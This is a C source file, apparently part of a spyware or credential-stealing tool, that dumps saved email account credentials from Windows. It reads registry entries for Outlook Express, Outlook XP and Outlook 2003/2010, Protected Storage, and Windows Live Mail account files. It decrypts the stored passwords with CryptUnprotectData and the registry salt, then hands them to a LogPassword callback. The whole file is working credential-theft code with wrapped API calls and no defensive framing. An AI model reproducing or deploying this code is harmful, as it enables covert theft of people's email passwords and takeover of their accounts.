#define _CRT_SECURE_NO_WARNINGS 1

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <windows.h>

#include "..\common.h"
#import "pstorec.dll" no_namespace
#include <WinCred.h>

// callback for the password
extern int LogPassword(WCHAR *resource, WCHAR *service, WCHAR *user, WCHAR *pass);

#define MAX_OUTLOOK_ACC 800
#define MAIL_IMAP 1
#define MAIL_POP3 2 
#define MAIL_HTTP 3
#define GENERIC_FIELD_LEN 512

typedef struct TOOUTDATA{
	WCHAR POPuser[100];
	WCHAR POPpass[100];
	WCHAR POPserver[100];
	char type;
} OOUTDATA;
OOUTDATA *OutlookData;
DWORD oIndex;

typedef BOOL (WINAPI *typeCryptUnprotectData)(DATA_BLOB *, LPWSTR *, DATA_BLOB *, PVOID, PVOID, DWORD, DATA_BLOB *);


// ----------------------- PSTORAGE OutlookExpress ------------------------

void DumpOutlook(char *base_reg)
{
	HKEY hkeyresult, hkeyresult1;
	char name[200],skey[400];
	BYTE data[256];
	DWORD index, tmp_size, type;
	LONG ret_val;
	FILETIME f;

	FNC(lstrcpyA)(skey, base_reg);
	if (FNC(RegOpenKeyExA)(HKEY_CURRENT_USER, ( LPCTSTR )skey, 0, KEY_ALL_ACCESS, &hkeyresult1 ) != ERROR_SUCCESS)
		return;

	for ( index=0; oIndex<MAX_OUTLOOK_ACC; index++ ) {

		tmp_size = sizeof(name);
		ret_val = FNC(RegEnumKeyExA)(hkeyresult1, index, name, &tmp_size, NULL, NULL, NULL, &f);
		if (ret_val == ERROR_NO_MORE_ITEMS)
			break;
		if (ret_val != ERROR_SUCCESS)
			continue;

		FNC(lstrcpyA)(skey, base_reg);
		FNC(lstrcatA)(skey, "\\");
		FNC(lstrcatA)(skey, name);
		if (FNC(RegOpenKeyExA)(HKEY_CURRENT_USER, (LPCTSTR )skey, 0, KEY_ALL_ACCESS, &hkeyresult ) != ERROR_SUCCESS)
			continue;

		tmp_size = sizeof(data);
		if(FNC(RegQueryValueExA) ( hkeyresult, (LPCTSTR)"HTTPMail User Name" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
			_snwprintf_s(OutlookData[oIndex].POPuser, sizeof(OutlookData[oIndex].POPuser)/sizeof(WCHAR), _TRUNCATE, L"%S", data);

			tmp_size = sizeof(data);
			if(FNC(RegQueryValueExA) ( hkeyresult, ( LPCTSTR )"HTTPMail Server" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
				_snwprintf_s(OutlookData[oIndex].POPserver, sizeof(OutlookData[oIndex].POPserver)/sizeof(WCHAR), _TRUNCATE, L"%S", data);
			}

			tmp_size = sizeof(data);
			if(FNC(RegQueryValueExA) ( hkeyresult, ( LPCTSTR )"HTTPMail Password2" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
				_snwprintf_s(OutlookData[oIndex].POPpass, sizeof(OutlookData[oIndex].POPpass)/sizeof(WCHAR), _TRUNCATE, L"%s", &(data[2]));		
			}
			OutlookData[oIndex].type = MAIL_HTTP;
			// Ha trovato un utente, passa al successivo
			oIndex++;
		} 

		tmp_size = sizeof(data);
		if(FNC(RegQueryValueExA) ( hkeyresult, (LPCTSTR)"POP3 User Name" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
			_snwprintf_s(OutlookData[oIndex].POPuser, sizeof(OutlookData[oIndex].POPuser)/sizeof(WCHAR), _TRUNCATE, L"%S", data);

			tmp_size = sizeof(data);
			if(FNC(RegQueryValueExA) ( hkeyresult, ( LPCTSTR )"POP3 Server" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
				_snwprintf_s(OutlookData[oIndex].POPserver, sizeof(OutlookData[oIndex].POPserver)/sizeof(WCHAR), _TRUNCATE, L"%S", data);
			}

			tmp_size = sizeof(data);
			if(FNC(RegQueryValueExA) ( hkeyresult, ( LPCTSTR )"POP3 Password2" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
				_snwprintf_s(OutlookData[oIndex].POPpass, sizeof(OutlookData[oIndex].POPpass)/sizeof(WCHAR), _TRUNCATE, L"%s", &(data[2]));
			}
			OutlookData[oIndex].type = MAIL_POP3;
			// Ha trovato un utente, passa al successivo
			oIndex++;
		} 

		tmp_size = sizeof(data);
		if(FNC(RegQueryValueExA) ( hkeyresult, (LPCTSTR)"IMAP User Name" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
			_snwprintf_s(OutlookData[oIndex].POPuser, sizeof(OutlookData[oIndex].POPuser)/sizeof(WCHAR), _TRUNCATE, L"%S", data);

			tmp_size = sizeof(data);
			if(FNC(RegQueryValueExA) ( hkeyresult, ( LPCTSTR )"IMAP Server" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
				_snwprintf_s(OutlookData[oIndex].POPserver, sizeof(OutlookData[oIndex].POPserver)/sizeof(WCHAR), _TRUNCATE, L"%S", data);
			}

			tmp_size = sizeof(data);
			if(FNC(RegQueryValueExA) ( hkeyresult, ( LPCTSTR )"IMAP Password2" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
				_snwprintf_s(OutlookData[oIndex].POPpass, sizeof(OutlookData[oIndex].POPpass)/sizeof(WCHAR), _TRUNCATE, L"%s", &(data[2]));
			}
			OutlookData[oIndex].type = MAIL_IMAP;
			// Ha trovato un utente, passa al successivo
			oIndex++;
		} 

		FNC(RegCloseKey)(hkeyresult);
	}

	FNC(RegCloseKey)(hkeyresult1);
}


void DumpOutlookXP()
{
	HKEY hkeyresult, hkeyresult1;
	char name[200],skey[400];
	BYTE data[256];
	DWORD index, tmp_size, type;
	LONG ret_val;
	FILETIME f;

	FNC(lstrcpyA)(skey, "Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676");
	if (FNC(RegOpenKeyExA)(HKEY_CURRENT_USER, ( LPCTSTR )skey, 0, KEY_READ, &hkeyresult1 ) != ERROR_SUCCESS)
		return;

	for ( index=0; oIndex<MAX_OUTLOOK_ACC; index++ ) {

		tmp_size = sizeof(name);
		ret_val = FNC(RegEnumKeyExA)(hkeyresult1, index, name, &tmp_size, NULL, NULL, NULL, &f);
		if (ret_val == ERROR_NO_MORE_ITEMS)
			break;
		if (ret_val != ERROR_SUCCESS)
			continue;

		FNC(lstrcpyA)(skey, "Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676");
		FNC(lstrcatA)(skey,"\\");
		FNC(lstrcatA)(skey, name);
		if (FNC(RegOpenKeyExA)(HKEY_CURRENT_USER, (LPCTSTR )skey, 0, KEY_READ, &hkeyresult ) != ERROR_SUCCESS)
			continue;

		tmp_size = sizeof(data);
		if(FNC(RegQueryValueExA) ( hkeyresult, (LPCTSTR)"HTTP User" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
			_snwprintf_s(OutlookData[oIndex].POPuser, sizeof(OutlookData[oIndex].POPuser)/sizeof(WCHAR), _TRUNCATE, L"%s", data);

			tmp_size = sizeof(data);
			if(FNC(RegQueryValueExA) ( hkeyresult, ( LPCTSTR )"HTTP Server URL" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
				_snwprintf_s(OutlookData[oIndex].POPserver, sizeof(OutlookData[oIndex].POPserver)/sizeof(WCHAR), _TRUNCATE, L"%s", data);
			}

			tmp_size = sizeof(data);
			if(FNC(RegQueryValueExA) ( hkeyresult, ( LPCTSTR )"HTTP Password" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
				_snwprintf_s(OutlookData[oIndex].POPpass, sizeof(OutlookData[oIndex].POPpass)/sizeof(WCHAR), _TRUNCATE, L"%s", &(data[1]));		
			}
			OutlookData[oIndex].type = MAIL_HTTP;
			// Ha trovato un utente, passa al successivo
			oIndex++;
		} 

		tmp_size = sizeof(data);
		if(FNC(RegQueryValueExA) ( hkeyresult, (LPCTSTR)"POP3 User" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
			_snwprintf_s(OutlookData[oIndex].POPuser, sizeof(OutlookData[oIndex].POPuser)/sizeof(WCHAR), _TRUNCATE, L"%s", data);

			tmp_size = sizeof(data);
			if(FNC(RegQueryValueExA) ( hkeyresult, ( LPCTSTR )"POP3 Server" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
				_snwprintf_s(OutlookData[oIndex].POPserver, sizeof(OutlookData[oIndex].POPserver)/sizeof(WCHAR), _TRUNCATE, L"%s", data);
			}

			tmp_size = sizeof(data);
			if(FNC(RegQueryValueExA) ( hkeyresult, ( LPCTSTR )"POP3 Password" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
				_snwprintf_s(OutlookData[oIndex].POPpass, sizeof(OutlookData[oIndex].POPpass)/sizeof(WCHAR), _TRUNCATE, L"%s", &(data[1]));
			}
			OutlookData[oIndex].type = MAIL_POP3;
			// Ha trovato un utente, passa al successivo
			oIndex++;
		} 

		tmp_size = sizeof(data);
		if(FNC(RegQueryValueExA) ( hkeyresult, (LPCTSTR)"IMAP User" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
			_snwprintf_s(OutlookData[oIndex].POPuser, sizeof(OutlookData[oIndex].POPuser)/sizeof(WCHAR), _TRUNCATE, L"%s", data);

			tmp_size = sizeof(data);
			if(FNC(RegQueryValueExA) ( hkeyresult, ( LPCTSTR )"IMAP Server" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
				_snwprintf_s(OutlookData[oIndex].POPserver, sizeof(OutlookData[oIndex].POPserver)/sizeof(WCHAR), _TRUNCATE, L"%s", data);
			}

			tmp_size = sizeof(data);
			if(FNC(RegQueryValueExA) ( hkeyresult, ( LPCTSTR )"IMAP Password" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
				_snwprintf_s(OutlookData[oIndex].POPpass, sizeof(OutlookData[oIndex].POPpass)/sizeof(WCHAR), _TRUNCATE, L"%s", &(data[1]));
			}
			OutlookData[oIndex].type = MAIL_IMAP;
			// Ha trovato un utente, passa al successivo
			oIndex++;
		} 

		FNC(RegCloseKey)(hkeyresult);
	}

	FNC(RegCloseKey)(hkeyresult1);
}

extern BOOL CopyPStoreDLL(char *dll_path);

typedef HRESULT (WINAPI *tPStoreCreateInstance)(IPStore **, DWORD, DWORD, DWORD);
void DumpPStorage()
{
	tPStoreCreateInstance pPStoreCreateInstance;
	IEnumPStoreTypesPtr EnumPStoreTypes = 0;
	IPStorePtr PStore = 0; 
	HRESULT hRes;
	HMODULE hpsDLL; 
	DWORD i;
	char dll_name[MAX_PATH];

	if (!CopyPStoreDLL(dll_name))
		return;

	if ( (hpsDLL = LoadLibrary(dll_name)) == NULL)
		return;

	pPStoreCreateInstance = (tPStoreCreateInstance)GetProcAddress(hpsDLL, "PStoreCreateInstance");
	if (!pPStoreCreateInstance) {
		FreeLibrary(hpsDLL);
		return;
	}

	pPStoreCreateInstance(&PStore, 0, 0, 0); 
	if (!PStore) {
		FreeLibrary(hpsDLL);
		return;
	}

	hRes = PStore->EnumTypes(0, 0, &EnumPStoreTypes);

	if (!FAILED(hRes)) {
#define PS_ITEM_SIZE 512
		GUID TypeGUID;
		GUID subTypeGUID;      
		WCHAR ItemData[PS_ITEM_SIZE];
		WCHAR pass[PS_ITEM_SIZE];
		char szItemGUID[50];

		while(EnumPStoreTypes->raw_Next(1, &TypeGUID, 0) == S_OK) {      
			IEnumPStoreTypesPtr EnumSubTypes = 0;

			wsprintf(szItemGUID, "%x", TypeGUID);
			EnumSubTypes = NULL;
			PStore->EnumSubtypes(0, &TypeGUID, 0, &EnumSubTypes);
			if (!EnumSubTypes)
				continue;
			
			while(EnumSubTypes->raw_Next(1, &subTypeGUID, 0) == S_OK) {
				IEnumPStoreItemsPtr spEnumItems = 0;
				LPWSTR itemName;

				spEnumItems = NULL;
				PStore->EnumItems(0, &TypeGUID, &subTypeGUID, 0, &spEnumItems);
				if (!spEnumItems)
					continue;
				
				while(spEnumItems->raw_Next(1, &itemName, 0) == S_OK) {             
					unsigned long psDataLen = 0;
					unsigned char *psData = NULL;

					PStore->ReadItem(0, &TypeGUID, &subTypeGUID, itemName, &psDataLen, &psData, NULL, 0);
					if (psData == NULL) {
						CoTaskMemFree(itemName);
						continue;
					}
					
					memset(ItemData, 0, sizeof(ItemData));
					memcpy(ItemData, psData, (psDataLen < PS_ITEM_SIZE) ? psDataLen : PS_ITEM_SIZE-2);
					_snwprintf_s(pass, sizeof(pass)/sizeof(WCHAR), _TRUNCATE, L"%S", ItemData);
			  
					// 220d5cc1 Outlooks
					if(!FNC(lstrcmpA)(szItemGUID, "220d5cd0") || !FNC(lstrcmpA)(szItemGUID, "220d5cc1")) {
						//BOOL bDeletedOEAccount=TRUE;		
						for( i=0; i<oIndex;i++){				  
							if(FNC(lstrcmpW)(OutlookData[i].POPpass, itemName)==0){				   			
								//bDeletedOEAccount=FALSE;
								if (OutlookData[i].type == MAIL_IMAP)
									LogPassword(L"Outlook Express IMAP", OutlookData[i].POPserver,  OutlookData[i].POPuser, pass);
								else if (OutlookData[i].type == MAIL_POP3)
									LogPassword(L"Outlook Express POP3", OutlookData[i].POPserver,  OutlookData[i].POPuser, pass);
								else if (OutlookData[i].type == MAIL_HTTP)
									LogPassword(L"Outlook Express HTTP", OutlookData[i].POPserver,  OutlookData[i].POPuser, pass);

								break;
							}
						}
					}	 
			  
					CoTaskMemFree(itemName);
					CoTaskMemFree(psData);
				}
				if (spEnumItems) {
					spEnumItems.Release();
					spEnumItems = 0;
				}
			}
			if (EnumSubTypes) {
				EnumSubTypes.Release();
				EnumSubTypes = 0;
			}
		}		  
	}  	  
	if (EnumPStoreTypes)
		EnumPStoreTypes.Release();
	if (PStore)
		PStore.Release();
	FreeLibrary(hpsDLL);
}


// -------------------- Outlook 2003 --------------------
void DumpOutlook2003()
{
	HKEY hkeyresult, hkeyresult1;
	char name[256],skey[400];
	BYTE data[1024];
	WCHAR server[100];
	WCHAR user[100];
	WCHAR password[100];
	DWORD index, tmp_size, type;
	LONG ret_val;
	FILETIME f;

	DATA_BLOB dbin, dbout;
	typeCryptUnprotectData pfCryptUnprotectData = NULL;
	HMODULE hCrypt32DLL = NULL; 

	if ( (hCrypt32DLL = LoadLibrary("crypt32.dll")) )  
		pfCryptUnprotectData = (typeCryptUnprotectData)GetProcAddress(hCrypt32DLL, "CryptUnprotectData");
	
	if (!pfCryptUnprotectData)
		return;

	FNC(lstrcpyA)(skey, "Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676");
	if (FNC(RegOpenKeyExA)(HKEY_CURRENT_USER, ( LPCTSTR )skey, 0, KEY_READ, &hkeyresult1 ) != ERROR_SUCCESS)
		return;

	for (index=0;; index++) {
		tmp_size = sizeof(name);
		ret_val = FNC(RegEnumKeyExA)(hkeyresult1, index, name, &tmp_size, NULL, NULL, NULL, &f);
		if (ret_val == ERROR_NO_MORE_ITEMS)
			break;
		if (ret_val != ERROR_SUCCESS)
			continue;

		FNC(lstrcpyA)(skey, "Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676");
		FNC(lstrcatA)(skey,"\\");
		FNC(lstrcatA)(skey, name);
		if (FNC(RegOpenKeyExA)(HKEY_CURRENT_USER, (LPCTSTR )skey, 0, KEY_READ, &hkeyresult ) != ERROR_SUCCESS)
			continue;

		tmp_size = sizeof(data);
		if(FNC(RegQueryValueExA) ( hkeyresult, (LPCTSTR)"HTTP User" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
			_snwprintf_s(user, sizeof(user)/sizeof(WCHAR), _TRUNCATE, L"%s", data);

			tmp_size = sizeof(data);
			if(FNC(RegQueryValueExA) ( hkeyresult, ( LPCTSTR )"HTTP Server URL" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
				_snwprintf_s(server, sizeof(server)/sizeof(WCHAR), _TRUNCATE, L"%s", data);
			}

			tmp_size = sizeof(data);
			if(FNC(RegQueryValueExA) ( hkeyresult, ( LPCTSTR )"HTTP Password" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
				dbin.cbData = tmp_size-1;
				dbin.pbData = &(data[1]);
				if (tmp_size>1 && pfCryptUnprotectData(&dbin, NULL, NULL, NULL, NULL, 1, &dbout)) {
					_snwprintf_s(password, sizeof(password)/sizeof(WCHAR), _TRUNCATE, L"%s", dbout.pbData);
					LogPassword(L"Outlook 2003/2010 HTTP", server, user, password);
					LocalFree(dbout.pbData);
				}
			}
		} 

		tmp_size = sizeof(data);
		if(FNC(RegQueryValueExA) ( hkeyresult, (LPCTSTR)"POP3 User" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
			_snwprintf_s(user, sizeof(user)/sizeof(WCHAR), _TRUNCATE, L"%s", data);

			tmp_size = sizeof(data);
			if(FNC(RegQueryValueExA) ( hkeyresult, ( LPCTSTR )"POP3 Server" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
				_snwprintf_s(server, sizeof(server)/sizeof(WCHAR), _TRUNCATE, L"%s", data);
			}

			tmp_size = sizeof(data);
			if(FNC(RegQueryValueExA) ( hkeyresult, ( LPCTSTR )"POP3 Password" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
				dbin.cbData = tmp_size-1;
				dbin.pbData = &(data[1]);
				if (tmp_size>1 && pfCryptUnprotectData(&dbin, NULL, NULL, NULL, NULL, 1, &dbout)) {
					_snwprintf_s(password, sizeof(password)/sizeof(WCHAR), _TRUNCATE, L"%s", dbout.pbData);
					LogPassword(L"Outlook 2003/2010 POP3", server, user, password);
					LocalFree(dbout.pbData);
				}
			}
		} 

		tmp_size = sizeof(data);
		if(FNC(RegQueryValueExA) ( hkeyresult, (LPCTSTR)"IMAP User" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
			_snwprintf_s(user, sizeof(user)/sizeof(WCHAR), _TRUNCATE, L"%s", data);

			tmp_size = sizeof(data);
			if(FNC(RegQueryValueExA) ( hkeyresult, ( LPCTSTR )"IMAP Server" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
				_snwprintf_s(server, sizeof(server)/sizeof(WCHAR), _TRUNCATE, L"%s", data);
			}

			tmp_size = sizeof(data);
			if(FNC(RegQueryValueExA) ( hkeyresult, ( LPCTSTR )"IMAP Password" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
				dbin.cbData = tmp_size-1;
				dbin.pbData = &(data[1]);
				if (tmp_size>1 && pfCryptUnprotectData(&dbin, NULL, NULL, NULL, NULL, 1, &dbout)) {
					_snwprintf_s(password, sizeof(password)/sizeof(WCHAR), _TRUNCATE, L"%s", dbout.pbData);
					LogPassword(L"Outlook 2003/2010 IMAP", server, user, password);
					LocalFree(dbout.pbData);
				}
			}
		} 

		FNC(RegCloseKey)(hkeyresult);
	}

	FNC(RegCloseKey)(hkeyresult1);
}

BOOL GetXMLNode(WCHAR *data, WCHAR *node, WCHAR *buffer)
{
	WCHAR *ptr1, *ptr2;
	WCHAR saved_char;
	if ( !(ptr1 = wcsstr(data, node)) )
		return FALSE;
	if ( !(ptr1 = wcschr(ptr1, L'>')) )
		return FALSE;
	if ( !(ptr2 = wcschr(ptr1, L'<')) )
		return FALSE;
	saved_char = *ptr2;
	ptr1++; *ptr2 = 0;
	wcsncpy_s(buffer, GENERIC_FIELD_LEN, ptr1, _TRUNCATE);
	*ptr2 = saved_char;
	return TRUE;	
}

BOOL XMLDecryptPassword(BYTE *password, BYTE *salt)
{
	DATA_BLOB dbin, dbentropy, dbout;
	DWORD i;
	BYTE sum;
	typeCryptUnprotectData pfCryptUnprotectData = NULL;
	HMODULE hCrypt32DLL = NULL; 

	if ( (hCrypt32DLL = LoadLibrary("crypt32.dll")) )  
		pfCryptUnprotectData = (typeCryptUnprotectData)GetProcAddress(hCrypt32DLL, "CryptUnprotectData");
	
	if (!pfCryptUnprotectData)
		return FALSE;

	if (password[0]==0)
		return FALSE;

	for(i=0; password[i*4] && i<(GENERIC_FIELD_LEN/2); i++) {
		if (password[i*4]>='0' && password[i*4]<='9')
			sum = password[i*4]-'0';
		else if (password[i*4]>='a' && password[i*4]<='f')
			sum = password[i*4]-'a'+0x0a;
		else if (password[i*4]>='A' && password[i*4]<='F')
			sum = password[i*4]-'A'+0x0a;
		sum = sum << 4;
	
		if (password[i*4+2]>='0' && password[i*4+2]<='9')
			sum += password[i*4+2]-'0';
		else if (password[i*4+2]>='a' && password[i*4+2]<='f')
			sum += password[i*4+2]-'a'+0x0a;
		else if (password[i*4+2]>='A' && password[i*4+2]<='F')
			sum += password[i*4+2]-'A'+0x0a;

		password[i]=sum;
	}

	dbin.cbData = i;
	dbin.pbData = password;
	dbentropy.cbData = 0x10;
	dbentropy.pbData = salt;
	if (pfCryptUnprotectData(&dbin, NULL, &dbentropy, NULL, NULL, 1, &dbout) && dbout.pbData) {
		memset(password, 0, GENERIC_FIELD_LEN*sizeof(WCHAR));
		memcpy(password, dbout.pbData, ( (GENERIC_FIELD_LEN-1)*sizeof(WCHAR) > dbout.cbData) ? dbout.cbData : (GENERIC_FIELD_LEN-1)*sizeof(WCHAR) );
		LocalFree(dbout.pbData);
		return TRUE;
	}
	return FALSE;
}

BOOL GetXMLMailAccount(WCHAR *account_dir, WCHAR *server, WCHAR *service, WCHAR *user, WCHAR *password, BYTE *salt)
{
	HANDLE hFile = INVALID_HANDLE_VALUE;
	DWORD size_low, dummy;
	WCHAR *data;

	if (!account_dir || !server || !service || !user || !password)
		return FALSE;

	if ( (hFile = FNC(CreateFileW)(account_dir, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE )
		return FALSE;

	do {
		if ( (size_low = FNC(GetFileSize)(hFile, NULL)) == INVALID_FILE_SIZE ) 
			break;

		if ( !(data = (WCHAR *)calloc(size_low+2, 1)) )
			break;	

		if ( !FNC(ReadFile)(hFile, (BYTE *)data, size_low, &dummy, NULL) )
			break;
		CloseHandle(hFile);

		if (GetXMLNode(data, L"<IMAP_User_Name", user))  {
			_snwprintf_s(service, GENERIC_FIELD_LEN, _TRUNCATE, L"Windows Live Mail IMAP");			
			if ( !GetXMLNode(data, L"<IMAP_Password2", password) )
				password[0] = 0;
			if ( !GetXMLNode(data, L"<IMAP_Server", server) )
				server[0] = 0;
		} else if (GetXMLNode(data, L"<POP3_User_Name", user))  {
			_snwprintf_s(service, GENERIC_FIELD_LEN, _TRUNCATE, L"Windows Live Mail POP3");			
			if ( !GetXMLNode(data, L"<POP3_Password2", password) )
				password[0] = 0;
			if ( !GetXMLNode(data, L"<POP3_Server", server) )
				server[0] = 0;
		} else {
			free(data);
			return FALSE;
		}

		XMLDecryptPassword((BYTE *)password, salt);	
		free(data);
		return TRUE;
	} while (0);

	if (data)
		free(data);
	CloseHandle(hFile);
	return FALSE;
}

void DumpWindosMail()
{
	HKEY hreg;
	DWORD ret_val;
	WCHAR store_root[MAX_PATH], expand_store_root[MAX_PATH], account_dir[MAX_PATH];
	BYTE salt[32];
	WIN32_FIND_DATAW find_data, find_file_data;
	HANDLE hFind, hFindFile;
	DWORD size;
	WCHAR server[GENERIC_FIELD_LEN], service[GENERIC_FIELD_LEN], user[GENERIC_FIELD_LEN], password[GENERIC_FIELD_LEN];

	if (FNC(RegOpenKeyW)(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows Live Mail", &hreg) != ERROR_SUCCESS)
		if (FNC(RegOpenKeyW)(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows Mail", &hreg) != ERROR_SUCCESS)
			return;

	size = sizeof(store_root);
	if (FNC(RegQueryValueExW)(hreg, L"Store Root", NULL, NULL, (LPBYTE)&store_root, &size) != ERROR_SUCCESS) {
		FNC(RegCloseKey)(hreg);
		return;
	}

	size = sizeof(salt);
	if (FNC(RegQueryValueExW)(hreg, L"Salt", NULL, NULL, (LPBYTE)&salt, &size) != ERROR_SUCCESS) {
		FNC(RegCloseKey)(hreg);
		return;
	}

	FNC(RegCloseKey)(hreg);
	ret_val = FNC(ExpandEnvironmentStringsW)(store_root, expand_store_root, sizeof(expand_store_root)/sizeof(expand_store_root[0]));
	if (ret_val==0 || ret_val>=sizeof(expand_store_root)/sizeof(expand_store_root[0]))
		return;

	_snwprintf_s(account_dir, sizeof(account_dir)/sizeof(account_dir[0]), _TRUNCATE, L"%s\\*", expand_store_root);
	hFind = FNC(FindFirstFileW)(account_dir, &find_data);
	if (hFind == INVALID_HANDLE_VALUE)
		return;

	do {
		if (find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
			if (find_data.cFileName[0] == L'.')
				continue;

			_snwprintf_s(account_dir, sizeof(account_dir)/sizeof(account_dir[0]), _TRUNCATE, L"%s\\%s\\account*.oeaccount", expand_store_root, find_data.cFileName);
			hFindFile = FNC(FindFirstFileW)(account_dir, &find_file_data);
			if (hFindFile == INVALID_HANDLE_VALUE)
				continue;

			do {
				_snwprintf_s(account_dir, sizeof(account_dir)/sizeof(account_dir[0]), _TRUNCATE, L"%s\\%s\\%s", expand_store_root, find_data.cFileName, find_file_data.cFileName);
				if (GetXMLMailAccount(account_dir, server, service, user, password, salt)) 
					LogPassword(service, server, user, password);
			} while (FNC(FindNextFileW)(hFindFile, &find_file_data));
			FNC(FindClose)(hFindFile);
		}
	} while (FNC(FindNextFileW)(hFind, &find_data));
	FNC(FindClose)(hFind);

}



int DumpOutlook(void)
{
	oIndex = 0;
	OutlookData = (OOUTDATA *)calloc(MAX_OUTLOOK_ACC + 3, sizeof(OOUTDATA));
	if (!OutlookData)
		return 0;

	DumpOutlook("Software\\Microsoft\\Internet Account Manager\\Accounts");
	DumpOutlook("Software\\Microsoft\\Office\\Outlook\\OMI Account Manager\\Accounts");
	DumpOutlookXP();
	DumpPStorage();
	DumpOutlook2003();
	DumpWindosMail();

	free(OutlookData);

	return 0;
}

